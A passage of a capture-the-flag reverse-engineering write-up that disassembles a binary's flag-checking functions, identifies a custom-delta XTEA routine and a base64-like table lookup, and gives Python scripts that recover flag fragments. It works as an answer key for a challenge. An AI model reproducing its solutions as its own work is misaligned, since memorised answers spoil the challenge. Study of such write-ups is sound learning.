  a9:   8b 45 b8                mov    eax,DWORD PTR [rbp-0x48]
  ac:   48 98                   cdqe   
  ae:   88 54 05 d0             mov    BYTE PTR [rbp+rax*1-0x30],dl
  b2:   83 45 b8 01             add    DWORD PTR [rbp-0x48],0x1
  b6:   8b 45 b8                mov    eax,DWORD PTR [rbp-0x48]
  b9:   3b 45 a4                cmp    eax,DWORD PTR [rbp-0x5c]
  bc:   7c bf                   jl     0x7d
  be:   c7 45 b8 00 00 00 00    mov    DWORD PTR [rbp-0x48],0x0
  c5:   eb 23                   jmp    0xea
  c7:   8b 45 b8                mov    eax,DWORD PTR [rbp-0x48]
  ca:   48 98                   cdqe   
  cc:   0f b6 54 05 d0          movzx  edx,BYTE PTR [rbp+rax*1-0x30]
  d1:   8b 45 b8                mov    eax,DWORD PTR [rbp-0x48]
  d4:   48 98                   cdqe   
  d6:   0f b6 44 05 c5          movzx  eax,BYTE PTR [rbp+rax*1-0x3b]
  db:   38 c2                   cmp    dl,al
  dd:   74 07                   je     0xe6
  df:   c7 45 bc 00 00 00 00    mov    DWORD PTR [rbp-0x44],0x0
  e6:   83 45 b8 01             add    DWORD PTR [rbp-0x48],0x1
  ea:   8b 45 b8                mov    eax,DWORD PTR [rbp-0x48]
  ed:   3b 45 a4                cmp    eax,DWORD PTR [rbp-0x5c]
  f0:   7c d5                   jl     0xc7
  f2:   8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
  f5:   48 8b 75 f8             mov    rsi,QWORD PTR [rbp-0x8]
  f9:   64 48 33 34 25 28 00    xor    rsi,QWORD PTR fs:0x28
 100:   00 00 
 102:   74 05                   je     0x109
 104:   e8 b4 fc ff ff          call   0xfffffffffffffdbd
 109:   c9                      leave  
 10a:   c3                      ret

```

check1 is easy to understand. Just a xor trick

The first part of flag is `tH4nK_U_s0`

```
check2:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 70             sub    rsp,0x70
   8:   48 89 7d 98             mov    QWORD PTR [rbp-0x68],rdi
   c:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  13:   00 00 
  15:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  19:   31 c0                   xor    eax,eax
  1b:   c7 45 a4 00 00 00 00    mov    DWORD PTR [rbp-0x5c],0x0
  22:   c7 45 a8 00 00 00 00    mov    DWORD PTR [rbp-0x58],0x0
  29:   c7 45 ac 00 00 00 00    mov    DWORD PTR [rbp-0x54],0x0
  30:   c7 45 b0 01 00 00 00    mov    DWORD PTR [rbp-0x50],0x1
  37:   c7 45 d0 bd 8d cb 95    mov    DWORD PTR [rbp-0x30],0x95cb8dbd
  3e:   c7 45 d4 79 cc 84 0f    mov    DWORD PTR [rbp-0x2c],0xf84cc79
  45:   c7 45 d8 76 a8 99 b8    mov    DWORD PTR [rbp-0x28],0xb899a876
  4c:   c7 45 dc 55 ab 5d 0a    mov    DWORD PTR [rbp-0x24],0xa5dab55
  53:   c7 45 e0 ba 3b 8b 9a    mov    DWORD PTR [rbp-0x20],0x9a8b3bba
  5a:   c7 45 e4 a7 38 b2 70    mov    DWORD PTR [rbp-0x1c],0x70b238a7
  61:   c7 45 e8 f1 3c b5 72    mov    DWORD PTR [rbp-0x18],0x72b53cf1
  68:   c7 45 ec 09 02 7c d4    mov    DWORD PTR [rbp-0x14],0xd47c0209
  6f:   c7 45 ac 00 00 00 00    mov    DWORD PTR [rbp-0x54],0x0
  76:   e9 13 01 00 00          jmp    0x18e
  7b:   8b 45 ac                mov    eax,DWORD PTR [rbp-0x54]
  7e:   48 63 d0                movsxd rdx,eax
  81:   48 8b 45 98             mov    rax,QWORD PTR [rbp-0x68]
  85:   48 01 d0                add    rax,rdx
  88:   0f b6 00                movzx  eax,BYTE PTR [rax]
  8b:   0f be c0                movsx  eax,al
  8e:   25 ff 00 00 00          and    eax,0xff
  93:   89 45 a4                mov    DWORD PTR [rbp-0x5c],eax
  96:   8b 45 ac                mov    eax,DWORD PTR [rbp-0x54]
  99:   48 98                   cdqe   
  9b:   48 8d 50 04             lea    rdx,[rax+0x4]
  9f:   48 8b 45 98             mov    rax,QWORD PTR [rbp-0x68]
  a3:   48 01 d0                add    rax,rdx
  a6:   0f b6 00                movzx  eax,BYTE PTR [rax]
  a9:   0f be c0                movsx  eax,al
  ac:   25 ff 00 00 00          and    eax,0xff
  b1:   89 45 a8                mov    DWORD PTR [rbp-0x58],eax
  b4:   c7 45 b4 00 00 00 00    mov    DWORD PTR [rbp-0x4c],0x0
  bb:   c7 45 bc ad de 37 13    mov    DWORD PTR [rbp-0x44],0x1337dead
  c2:   c7 45 c0 43 00 00 00    mov    DWORD PTR [rbp-0x40],0x43
  c9:   c7 45 c4 30 00 00 00    mov    DWORD PTR [rbp-0x3c],0x30
  d0:   c7 45 c8 52 00 00 00    mov    DWORD PTR [rbp-0x38],0x52
  d7:   c7 45 cc 33 00 00 00    mov    DWORD PTR [rbp-0x34],0x33
  de:   c7 45 b8 00 00 00 00    mov    DWORD PTR [rbp-0x48],0x0
  e5:   c7 45 b8 00 00 00 00    mov    DWORD PTR [rbp-0x48],0x0
  ec:   eb 65                   jmp    0x153
  ee:   8b 45 a8                mov    eax,DWORD PTR [rbp-0x58]
  f1:   c1 e0 04                shl    eax,0x4
  f4:   89 c2                   mov    edx,eax
  f6:   8b 45 a8                mov    eax,DWORD PTR [rbp-0x58]
  f9:   c1 e8 05                shr    eax,0x5
  fc:   31 c2                   xor    edx,eax
  fe:   8b 45 a8                mov    eax,DWORD PTR [rbp-0x58]
 101:   8d 0c 02                lea    ecx,[rdx+rax*1]
 104:   8b 45 b4                mov    eax,DWORD PTR [rbp-0x4c]
 107:   83 e0 03                and    eax,0x3
 10a:   89 c0                   mov    eax,eax
 10c:   8b 54 85 c0             mov    edx,DWORD PTR [rbp+rax*4-0x40]
 110:   8b 45 b4                mov    eax,DWORD PTR [rbp-0x4c]
 113:   01 d0                   add    eax,edx
 115:   31 c8                   xor    eax,ecx
 117:   01 45 a4                add    DWORD PTR [rbp-0x5c],eax
 11a:   8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
 11d:   01 45 b4                add    DWORD PTR [rbp-0x4c],eax
 120:   8b 45 a4                mov    eax,DWORD PTR [rbp-0x5c]
 123:   c1 e0 04                shl    eax,0x4
 126:   89 c2                   mov    edx,eax
 128:   8b 45 a4                mov    eax,DWORD PTR [rbp-0x5c]
 12b:   c1 e8 05                shr    eax,0x5
 12e:   31 c2                   xor    edx,eax
 130:   8b 45 a4                mov    eax,DWORD PTR [rbp-0x5c]
 133:   8d 0c 02                lea    ecx,[rdx+rax*1]
 136:   8b 45 b4                mov    eax,DWORD PTR [rbp-0x4c]
 139:   c1 e8 0b                shr    eax,0xb
 13c:   83 e0 03                and    eax,0x3
 13f:   89 c0                   mov    eax,eax
 141:   8b 54 85 c0             mov    edx,DWORD PTR [rbp+rax*4-0x40]
 145:   8b 45 b4                mov    eax,DWORD PTR [rbp-0x4c]
 148:   01 d0                   add    eax,edx
 14a:   31 c8                   xor    eax,ecx
 14c:   01 45 a8                add    DWORD PTR [rbp-0x58],eax
 14f:   83 45 b8 01             add    DWORD PTR [rbp-0x48],0x1
 153:   83 7d b8 1f             cmp    DWORD PTR [rbp-0x48],0x1f
 157:   7e 95                   jle    0xee
 159:   8b 45 ac                mov    eax,DWORD PTR [rbp-0x54]
 15c:   01 c0                   add    eax,eax
 15e:   48 98                   cdqe   
 160:   8b 44 85 d0             mov    eax,DWORD PTR [rbp+rax*4-0x30]
 164:   39 45 a4                cmp    DWORD PTR [rbp-0x5c],eax
 167:   74 07                   je     0x170
 169:   c7 45 b0 00 00 00 00    mov    DWORD PTR [rbp-0x50],0x0
 170:   8b 45 ac                mov    eax,DWORD PTR [rbp-0x54]
 173:   01 c0                   add    eax,eax
 175:   83 c0 01                add    eax,0x1
 178:   48 98                   cdqe   
 17a:   8b 44 85 d0             mov    eax,DWORD PTR [rbp+rax*4-0x30]
 17e:   39 45 a8                cmp    DWORD PTR [rbp-0x58],eax
 181:   74 07                   je     0x18a
 183:   c7 45 b0 00 00 00 00    mov    DWORD PTR [rbp-0x50],0x0
 18a:   83 45 ac 01             add    DWORD PTR [rbp-0x54],0x1
 18e:   83 7d ac 03             cmp    DWORD PTR [rbp-0x54],0x3
 192:   0f 8e e3 fe ff ff       jle    0x7b
 198:   8b 45 b0                mov    eax,DWORD PTR [rbp-0x50]
 19b:   48 8b 75 f8             mov    rsi,QWORD PTR [rbp-0x8]
 19f:   64 48 33 34 25 28 00    xor    rsi,QWORD PTR fs:0x28
 1a6:   00 00 
 1a8:   74 05                   je     0x1af
 1aa:   e8 fd fa ff ff          call   0xfffffffffffffcac
 1af:   c9                      leave  
 1b0:   c3                      ret

```

`shl    eax,0x4` and `shr    eax,0x5` indicate that check2 is XTEA encryption. However, the delta is `0x1337dead` instead of `0x9E3779B9`. It's a customized XTEA encryption.

I use the following script to get the second part of flag which is `_muCh_F0`

```python=
key=[0x43,0x30,0x52,0x33]



num_rounds=0x20
v0=95
v1=104
delta=0x1337dead
sum1=0;

for i in range(0x20):
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum1 + key[sum1 & 3]);
        v0 %= 0x100000000
        sum1 += delta;
        sum1 %= 0x100000000
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum1 + key[(sum1>>11) & 3]);
        v1 %= 0x100000000
print hex(v0),hex(v1)


flag1=""
flag2=""

v=[0x95cb8dbd,0xf84cc79]
num_rounds=0x20
v0=v[0]
v1=v[1]
delta=0x1337dead
sum1=delta*num_rounds;

for i in range(0x20):
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum1 + key[(sum1>>11) & 3]);
        v1 %= 0x100000000
        sum1 -= delta;
        sum1 %= 0x100000000
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum1 + key[sum1 & 3]);
        v0 %= 0x100000000
print chr(v0),chr(v1)
flag1+=chr(v0)
flag2+=chr(v1)

v=[0xb899a876,0xa5dab55]
num_rounds=0x20
v0=v[0]
v1=v[1]
delta=0x1337dead
sum1=delta*num_rounds;

for i in range(0x20):
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum1 + key[(sum1>>11) & 3]);
        v1 %= 0x100000000
        sum1 -= delta;
        sum1 %= 0x100000000
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum1 + key[sum1 & 3]);
        v0 %= 0x100000000
print chr(v0),chr(v1)
flag1+=chr(v0)
flag2+=chr(v1)
v=[0x9a8b3bba,0x70b238a7]
num_rounds=0x20
v0=v[0]
v1=v[1]
delta=0x1337dead
sum1=delta*num_rounds;

for i in range(0x20):
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum1 + key[(sum1>>11) & 3]);
        v1 %= 0x100000000
        sum1 -= delta;
        sum1 %= 0x100000000
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum1 + key[sum1 & 3]);
        v0 %= 0x100000000
print chr(v0),chr(v1)
flag1+=chr(v0)
flag2+=chr(v1)
v=[0x72b53cf1,0xd47c0209]
num_rounds=0x20
v0=v[0]
v1=v[1]
delta=0x1337dead
sum1=delta*num_rounds;

for i in range(0x20):
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum1 + key[(sum1>>11) & 3]);
        v1 %= 0x100000000
        sum1 -= delta;
        sum1 %= 0x100000000
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum1 + key[sum1 & 3]);
        v0 %= 0x100000000
print chr(v0),chr(v1)
flag1+=chr(v0)
flag2+=chr(v1)


print flag1+flag2
# _muCh_F0
```

```
check3:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 81 ec e0 00 00 00    sub    rsp,0xe0
   b:   48 89 bd 28 ff ff ff    mov    QWORD PTR [rbp-0xd8],rdi
  12:   89 b5 24 ff ff ff       mov    DWORD PTR [rbp-0xdc],esi
  18:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  1f:   00 00 
  21:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  25:   31 c0                   xor    eax,eax
  27:   48 c7 85 70 ff ff ff    mov    QWORD PTR [rbp-0x90],0x0
  2e:   00 00 00 00 
  32:   48 c7 85 78 ff ff ff    mov    QWORD PTR [rbp-0x88],0x0
  39:   00 00 00 00 
  3d:   48 c7 45 80 00 00 00    mov    QWORD PTR [rbp-0x80],0x0
  44:   00 
  45:   48 c7 45 88 00 00 00    mov    QWORD PTR [rbp-0x78],0x0
  4c:   00 
  4d:   48 c7 45 90 00 00 00    mov    QWORD PTR [rbp-0x70],0x0
  54:   00 
  55:   48 c7 45 98 00 00 00    mov    QWORD PTR [rbp-0x68],0x0
  5c:   00 
  5d:   66 c7 45 a0 00 00       mov    WORD PTR [rbp-0x60],0x0
  63:   48 b8 2a 7c 2d 49 66    movabs rax,0x32716e66492d7c2a
  6a:   6e 71 32 
  6d:   48 ba 30 21 20 0a 41    movabs rdx,0x24645a410a202130
  74:   5a 64 24 
  77:   48 89 45 b0             mov    QWORD PTR [rbp-0x50],rax
  7b:   48 89 55 b8             mov    QWORD PTR [rbp-0x48],rdx
  7f:   48 b8 72 3c 58 6f 5c    movabs rax,0x7b2f445c6f583c72
  86:   44 2f 7b 
  89:   48 ba 4b 43 7e 61 34    movabs rdx,0x377a5434617e434b
  90:   54 7a 37 
  93:   48 89 45 c0             mov    QWORD PTR [rbp-0x40],rax
  97:   48 89 55 c8             mov    QWORD PTR [rbp-0x38],rdx
  9b:   48 b8 29 59 5e 3a 78    movabs rax,0x7d0b60783a5e5929
  a2:   60 0b 7d 
  a5:   48 ba 53 73 31 79 4f    movabs rdx,0x76696d4f79317353
  ac:   6d 69 76 
  af:   48 89 45 d0             mov    QWORD PTR [rbp-0x30],rax
  b3:   48 89 55 d8             mov    QWORD PTR [rbp-0x28],rdx
  b7:   48 b8 23 0d 25 5d 40    movabs rax,0x4e5f5b405d250d23
  be:   5b 5f 4e 
  c1:   48 ba 28 48 6a 2c 56    movabs rdx,0x677551562c6a4828
  c8:   51 75 67 
  cb:   48 89 45 e0             mov    QWORD PTR [rbp-0x20],rax
  cf:   48 89 55 e8             mov    QWORD PTR [rbp-0x18],rdx
  d3:   c6 45 f0 00             mov    BYTE PTR [rbp-0x10],0x0
  d7:   48 b8 34 60 51 25 41    movabs rax,0x23415f4125516034
  de:   5f 41 23 
  e1:   48 ba 54 3a 5a 25 41    movabs rdx,0x7d482f41255a3a54
  e8:   2f 48 7d 
  eb:   48 89 85 50 ff ff ff    mov    QWORD PTR [rbp-0xb0],rax
  f2:   48 89 95 58 ff ff ff    mov    QWORD PTR [rbp-0xa8],rdx
  f9:   48 b8 7b 25 6d 53 41    movabs rax,0xb515b41536d257b
 100:   5b 51 0b 
 103:   48 89 85 60 ff ff ff    mov    QWORD PTR [rbp-0xa0],rax
 10a:   c6 85 68 ff ff ff 00    mov    BYTE PTR [rbp-0x98],0x0
 111:   c7 85 30 ff ff ff 01    mov    DWORD PTR [rbp-0xd0],0x1
 118:   00 00 00 
 11b:   8b 85 24 ff ff ff       mov    eax,DWORD PTR [rbp-0xdc]
 121:   48 63 d0                movsxd rdx,eax
 124:   48 8b 85 28 ff ff ff    mov    rax,QWORD PTR [rbp-0xd8]
 12b:   48 01 d0                add    rax,rdx
 12e:   48 89 85 48 ff ff ff    mov    QWORD PTR [rbp-0xb8],rax
 135:   48 8b 85 28 ff ff ff    mov    rax,QWORD PTR [rbp-0xd8]
 13c:   48 89 85 40 ff ff ff    mov    QWORD PTR [rbp-0xc0],rax
 143:   48 8d 85 70 ff ff ff    lea    rax,[rbp-0x90]
 14a:   48 89 85 38 ff ff ff    mov    QWORD PTR [rbp-0xc8],rax
 151:   e9 fa 00 00 00          jmp    0x250
 156:   48 8b 85 40 ff ff ff    mov    rax,QWORD PTR [rbp-0xc0]
 15d:   0f b6 00                movzx  eax,BYTE PTR [rax]
 160:   c0 e8 02                shr    al,0x2
 163:   0f b6 c0                movzx  eax,al
 166:   48 98                   cdqe   
 168:   0f b6 4c 05 b0          movzx  ecx,BYTE PTR [rbp+rax*1-0x50]
 16d:   48 8b 85 38 ff ff ff    mov    rax,QWORD PTR [rbp-0xc8]
 174:   48 8d 50 01             lea    rdx,[rax+0x1]
 178:   48 89 95 38 ff ff ff    mov    QWORD PTR [rbp-0xc8],rdx
 17f:   89 ca                   mov    edx,ecx
 181:   88 10                   mov    BYTE PTR [rax],dl
 183:   48 8b 85 40 ff ff ff    mov    rax,QWORD PTR [rbp-0xc0]
 18a:   0f b6 00                movzx  eax,BYTE PTR [rax]
 18d:   0f b6 c0                movzx  eax,al
 190:   c1 e0 04                shl    eax,0x4
 193:   83 e0 30                and    eax,0x30
 196:   89 c2                   mov    edx,eax
 198:   48 8b 85 40 ff ff ff    mov    rax,QWORD PTR [rbp-0xc0]
 19f:   48 83 c0 01             add    rax,0x1
 1a3:   0f b6 00                movzx  eax,BYTE PTR [rax]
 1a6:   c0 e8 04                shr    al,0x4
 1a9:   0f b6 c0                movzx  eax,al
 1ac:   09 d0                   or     eax,edx
 1ae:   48 98                   cdqe   
 1b0:   0f b6 4c 05 b0          movzx  ecx,BYTE PTR [rbp+rax*1-0x50]
 1b5:   48 8b 85 38 ff ff ff    mov    rax,QWORD PTR [rbp-0xc8]
 1bc:   48 8d 50 01             lea    rdx,[rax+0x1]
 1c0:   48 89 95 38 ff ff ff    mov    QWORD PTR [rbp-0xc8],rdx
 1c7:   89 ca                   mov    edx,ecx
 1c9:   88 10                   mov    BYTE PTR [rax],dl
 1cb:   48 8b 85 40 ff ff ff    mov    rax,QWORD PTR [rbp-0xc0]
 1d2:   48 83 c0 01             add    rax,0x1
 1d6:   0f b6 00                movzx  eax,BYTE PTR [rax]
 1d9:   0f b6 c0                movzx  eax,al
 1dc:   c1 e0 02                shl    eax,0x2
 1df:   83 e0 3c                and    eax,0x3c
 1e2:   89 c2                   mov    edx,eax
 1e4:   48 8b 85 40 ff ff ff    mov    rax,QWORD PTR [rbp-0xc0]
 1eb:   48 83 c0 02             add    rax,0x2
 1ef:   0f b6 00                movzx  eax,BYTE PTR [rax]
 1f2:   c0 e8 06                shr    al,0x6
 1f5:   0f b6 c0                movzx  eax,al
 1f8:   09 d0                   or     eax,edx
 1fa:   48 98                   cdqe   
 1fc:   0f b6 4c 05 b0          movzx  ecx,BYTE PTR [rbp+rax*1-0x50]
 201:   48 8b 85 38 ff ff ff    mov    rax,QWORD PTR [rbp-0xc8]
 208:   48 8d 50 01             lea    rdx,[rax+0x1]
 20c:   48 89 95 38 ff ff ff    mov    QWORD PTR [rbp-0xc8],rdx
 213:   89 ca                   mov    edx,ecx
 215:   88 10                   mov    BYTE PTR [rax],dl
 217:   48 8b 85 40 ff ff ff    mov    rax,QWORD PTR [rbp-0xc0]
 21e:   48 83 c0 02             add    rax,0x2
 222:   0f b6 00                movzx  eax,BYTE PTR [rax]
 225:   0f b6 c0                movzx  eax,al
 228:   83 e0 3f                and    eax,0x3f
 22b:   48 98                   cdqe   
 22d:   0f b6 4c 05 b0          movzx  ecx,BYTE PTR [rbp+rax*1-0x50]
 232:   48 8b 85 38 ff ff ff    mov    rax,QWORD PTR [rbp-0xc8]
 239:   48 8d 50 01             lea    rdx,[rax+0x1]
 23d:   48 89 95 38 ff ff ff    mov    QWORD PTR [rbp-0xc8],rdx
 244:   89 ca                   mov    edx,ecx
 246:   88 10                   mov    BYTE PTR [rax],dl
 248:   48 83 85 40 ff ff ff    add    QWORD PTR [rbp-0xc0],0x3
 24f:   03 
 250:   48 8b 95 48 ff ff ff    mov    rdx,QWORD PTR [rbp-0xb8]
 257:   48 8b 85 40 ff ff ff    mov    rax,QWORD PTR [rbp-0xc0]
 25e:   48 29 c2                sub    rdx,rax
 261:   48 89 d0                mov    rax,rdx
 264:   48 83 f8 02             cmp    rax,0x2
 268:   0f 8f e8 fe ff ff       jg     0x156
 26e:   c7 85 34 ff ff ff 00    mov    DWORD PTR [rbp-0xcc],0x0
 275:   00 00 00 
 278:   c7 85 34 ff ff ff 00    mov    DWORD PTR [rbp-0xcc],0x0
 27f:   00 00 00 
 282:   eb 3b                   jmp    0x2bf
 284:   8b 85 34 ff ff ff       mov    eax,DWORD PTR [rbp-0xcc]
 28a:   48 98                   cdqe   
 28c:   0f b6 84 05 70 ff ff    movzx  eax,BYTE PTR [rbp+rax*1-0x90]
 293:   ff 
 294:   0f b6 d0                movzx  edx,al
 297:   8b 85 34 ff ff ff       mov    eax,DWORD PTR [rbp-0xcc]
 29d:   48 98                   cdqe   
 29f:   0f b6 84 05 50 ff ff    movzx  eax,BYTE PTR [rbp+rax*1-0xb0]
 2a6:   ff 
 2a7:   0f be c0                movsx  eax,al
 2aa:   39 c2                   cmp    edx,eax
 2ac:   74 0a                   je     0x2b8
 2ae:   c7 85 30 ff ff ff 00    mov    DWORD PTR [rbp-0xd0],0x0
 2b5:   00 00 00 
 2b8:   83 85 34 ff ff ff 01    add    DWORD PTR [rbp-0xcc],0x1
 2bf:   83 bd 34 ff ff ff 17    cmp    DWORD PTR [rbp-0xcc],0x17
 2c6:   7e bc                   jle    0x284
 2c8:   8b 85 30 ff ff ff       mov    eax,DWORD PTR [rbp-0xd0]
 2ce:   48 8b 75 f8             mov    rsi,QWORD PTR [rbp-0x8]
 2d2:   64 48 33 34 25 28 00    xor    rsi,QWORD PTR fs:0x28
 2d9:   00 00 
 2db:   74 05                   je     0x2e2
 2dd:   e8 19 f8 ff ff          call   0xfffffffffffffafb
 2e2:   c9                      leave  
 2e3:   c3                      ret

```

I didn't figure out what exactly the check3 function is. I just translate it to python script and brute force the third part of flag which is `r_r3c0v3r1ng_+h3_f`

```python=
from pwn import *
import string

cipher=p64(0x23415f4125516034)+p64(0x7d482f41255a3a54)+p64(0xb515b41536d257b)

a=[
0x32716e66492d7c2a
,0x24645a410a202130
,0x7b2f445c6f583c72
,0x377a5434617e434b
,0x7d0b60783a5e5929
,0x76696d4f79317353
,0x4e5f5b405d250d23
,0x677551562c6a4828
]
table="".join(map(p64,a))

def findpossible_one(cpos):
  ret=[]
  for i in string.printable:
    a=ord(i)
    a>>=2
    cc=table[a]
    if cc == cipher[cpos]:
      #print i
      ret.append(i)
  return ret

def findpossible_two(first,cpos):
  ret=[]
  for i in string.printable:
    a=ord(i)
    a>>=4
    for j in first:
      c=ord(j)
      c<<=4
      c&=0x30
      c|=a
      cc=table[c]
      if cc == cipher[cpos]:
        #print i
        ret.append([j,i])
  return ret 
def findpossible_three(two,cpos):
  ret=[]
  for i in string.printable:
    a=ord(i)
    a>>=6
    for j in two:
      c=ord(j[1])
      c<<=2
      c&=0x3c
      c|=a
      cc=table[c]
      if cc == cipher[cpos]:
        #print i
        ret.append(j+[i])
  return ret 

def findpossible_last(three,cpos):
  ret=[]
  for j in three:
      c=ord(j[2])
      c&=0x3f
      cc=table[c]
      if cc == cipher[cpos]:
        #print i
        ret.append(j)
  return ret 
flag=""
for i in range(0,len(cipher),4):
  first = findpossible_one(i)
  print first
  two=findpossible_two(first,i+1)
  print two
  three=findpossible_three(two,i+2)
  print three
  last=findpossible_last(three,i+3)
  if len(last) !=1:
    print "error"
    exit()
  flag+="".join(last[0])
  print flag


```

```
check4:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 81 ec a0 04 00 00    sub    rsp,0x4a0
   b:   48 89 bd 68 fb ff ff    mov    QWORD PTR [rbp-0x498],rdi
  12:   89 b5 64 fb ff ff       mov    DWORD PTR [rbp-0x49c],esi
  18:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  1f:   00 00 
  21:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  25:   31 c0                   xor    eax,eax
  27:   48 8d 95 90 fb ff ff    lea    rdx,[rbp-0x470]
  2e:   b8 00 00 00 00          mov    eax,0x0
  33:   b9 7d 00 00 00          mov    ecx,0x7d
  38:   48 89 d7                mov    rdi,rdx
  3b:   f3 48 ab                rep stos QWORD PTR es:[rdi],rax
  3e:   48 b8 50 6c 33 61 73    movabs rax,0x30645f7361336c50
  45:   5f 64 30 
  48:   48 ba 6e 27 74 5f 63    movabs rdx,0x353452635f74276e
  4f:   52 34 35 
  52:   48 89 45 90             mov    QWORD PTR [rbp-0x70],rax
  56:   48 89 55 98             mov    QWORD PTR [rbp-0x68],rdx
  5a:   48 b8 68 5f 31 6e 5f    movabs rax,0x21682b5f6e315f68
  61:   2b 68 21 
  64:   48 ba 73 5f 66 55 6e    movabs rdx,0x312b436e55665f73
  6b:   43 2b 31 
  6e:   48 89 45 a0             mov    QWORD PTR [rbp-0x60],rax
  72:   48 89 55 a8             mov    QWORD PTR [rbp-0x58],rdx
  76:   66 c7 45 b0 30 6e       mov    WORD PTR [rbp-0x50],0x6e30
  7c:   c6 45 b2 00             mov    BYTE PTR [rbp-0x4e],0x0
  80:   48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40],0x0
  87:   00 
  88:   48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
  8f:   00 
  90:   48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  97:   00 
  98:   48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  9f:   00 
  a0:   48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  a7:   00 
  a8:   48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18],0x0
  af:   00 
  b0:   66 c7 45 f0 00 00       mov    WORD PTR [rbp-0x10],0x0
  b6:   48 b8 2b 55 5d 93 a0    movabs rax,0x14dd43a0935d552b
  bd:   43 dd 14 
  c0:   48 89 45 83             mov    QWORD PTR [rbp-0x7d],rax
  c4:   c7 45 8b 43 52 7d e5    mov    DWORD PTR [rbp-0x75],0xe57d5243
  cb:   c6 45 8f 00             mov    BYTE PTR [rbp-0x71],0x0
  cf:   c7 85 80 fb ff ff 22    mov    DWORD PTR [rbp-0x480],0x22
  d6:   00 00 00 
  d9:   c7 85 70 fb ff ff 00    mov    DWORD PTR [rbp-0x490],0x0
  e0:   00 00 00 
  e3:   c7 85 74 fb ff ff 00    mov    DWORD PTR [rbp-0x48c],0x0
  ea:   00 00 00 
  ed:   c7 85 78 fb ff ff 01    mov    DWORD PTR [rbp-0x488],0x1
  f4:   00 00 00 
  f7:   c7 85 70 fb ff ff 00    mov    DWORD PTR [rbp-0x490],0x0
  fe:   00 00 00 
 101:   eb 1c                   jmp    0x11f
 103:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 109:   48 98                   cdqe   
 10b:   8b 95 70 fb ff ff       mov    edx,DWORD PTR [rbp-0x490]
 111:   89 94 85 90 fb ff ff    mov    DWORD PTR [rbp+rax*4-0x470],edx
 118:   83 85 70 fb ff ff 01    add    DWORD PTR [rbp-0x490],0x1
 11f:   81 bd 70 fb ff ff f5    cmp    DWORD PTR [rbp-0x490],0xf5
 126:   00 00 00 
 129:   7e d8                   jle    0x103
 12b:   c7 85 70 fb ff ff 00    mov    DWORD PTR [rbp-0x490],0x0
 132:   00 00 00 
 135:   e9 b3 00 00 00          jmp    0x1ed
 13a:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 140:   48 98                   cdqe   
 142:   8b 94 85 90 fb ff ff    mov    edx,DWORD PTR [rbp+rax*4-0x470]
 149:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 14f:   8d 0c 02                lea    ecx,[rdx+rax*1]
 152:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 158:   99                      cdq    
 159:   f7 bd 80 fb ff ff       idiv   DWORD PTR [rbp-0x480]
 15f:   89 d0                   mov    eax,edx
 161:   48 98                   cdqe   
 163:   0f b6 44 05 90          movzx  eax,BYTE PTR [rbp+rax*1-0x70]
 168:   0f b6 c0                movzx  eax,al
 16b:   01 c1                   add    ecx,eax
 16d:   ba 15 02 4d 21          mov    edx,0x214d0215
 172:   89 c8                   mov    eax,ecx
 174:   f7 ea                   imul   edx
 176:   c1 fa 05                sar    edx,0x5
 179:   89 c8                   mov    eax,ecx
 17b:   c1 f8 1f                sar    eax,0x1f
 17e:   29 c2                   sub    edx,eax
 180:   89 d0                   mov    eax,edx
 182:   89 85 74 fb ff ff       mov    DWORD PTR [rbp-0x48c],eax
 188:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 18e:   69 c0 f6 00 00 00       imul   eax,eax,0xf6
 194:   29 c1                   sub    ecx,eax
 196:   89 c8                   mov    eax,ecx
 198:   89 85 74 fb ff ff       mov    DWORD PTR [rbp-0x48c],eax
 19e:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 1a4:   48 98                   cdqe   
 1a6:   8b 84 85 90 fb ff ff    mov    eax,DWORD PTR [rbp+rax*4-0x470]
 1ad:   89 85 8c fb ff ff       mov    DWORD PTR [rbp-0x474],eax
 1b3:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
 1b9:   48 98                   cdqe   
 1bb:   8b 94 85 90 fb ff ff    mov    edx,DWORD PTR [rbp+rax*4-0x470]
 1c2:   8b 85 70 fb ff ff       mov    eax,DWORD PTR [rbp-0x490]
 1c8:   48 98                   cdqe   
 1ca:   89 94 85 90 fb ff ff    mov    DWORD PTR [rbp+rax*4-0x470],edx
 1d1:   8b 85 74 fb ff ff       mov    eax,DWORD PTR [rbp-0x48c]
